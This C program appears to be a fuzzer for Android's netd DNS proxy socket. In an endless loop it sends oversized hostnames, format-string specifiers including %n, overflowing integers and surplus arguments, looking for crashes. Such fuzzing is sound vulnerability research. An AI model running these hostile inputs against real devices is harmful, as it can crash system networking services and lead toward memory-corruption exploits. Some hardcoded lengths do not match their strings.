#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>
#include <time.h>

#define SOCK_PATH "/dev/socket/dnsproxyd"

int connect_sock() {
    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    struct sockaddr_un addr = {0};
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCK_PATH, sizeof(addr.sun_path)-1);
    if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(fd); return -1;
    }
    return fd;
}

void fuzz_cmd(const char *cmd, int len) {
    int fd = connect_sock();
    if (fd < 0) return;
    write(fd, cmd, len);
    char buf[128];
    // Read response to ensure netd processed it (or crashed)
    read(fd, buf, sizeof(buf)); 
    close(fd);
}

int main(int argc, char **argv) {
    srand(time(NULL));
    printf("Starting dnsproxyd fuzzer...\n");
    
    char bigbuf[8192];
    int count = 0;
    
    while(1) {
        // Case 1: Huge hostname with repeated chars
        memset(bigbuf, 'A', sizeof(bigbuf));
        int hostlen = rand() % 4000 + 100;
        
        // Format: getaddrinfo <host> ^ <service> <hints...>
        // We construct it manually to ensure 'A's are there
        char *p = bigbuf;
        p += sprintf(p, "getaddrinfo ");
        memset(p, 'A', hostlen);
        p += hostlen;
        p += sprintf(p, " ^ 2 1 0 0 0");
        
        fuzz_cmd(bigbuf, p - bigbuf + 1);
        
        // Case 2: Format strings
        fuzz_cmd("getaddrinfo %s%s%s%s%s%s ^ 2 1 0 0 0", 35);
        fuzz_cmd("getaddrinfo %n%n%n%n%n%n ^ 2 1 0 0 0", 35);
        fuzz_cmd("getaddrinfo %p%p%p%p%p%p ^ 2 1 0 0 0", 35);
        fuzz_cmd("getaddrinfo %x%x%x%x%x%x ^ 2 1 0 0 0", 35);
        
        // Case 3: Integer overflow / Negative values
        fuzz_cmd("getaddrinfo localhost ^ -1 -1 -1 -1 -1", 40);
        fuzz_cmd("getaddrinfo localhost ^ 2147483648 2147483648 0 0 0", 55);
        
        // Case 4: Long args / buffer overflow in parsing
        // netd parses args with strtoul or similar?
        // Let's try long numeric args
        fuzz_cmd("getaddrinfo localhost ^ 2 1 0 0 0 0 0 0 0 0 0 0 0 0 0", 60);

        if (++count % 100 == 0) {
            printf("%d commands sent\r", count);
            fflush(stdout);
        }
        usleep(2000); // 2ms delay
    }
    return 0;
}
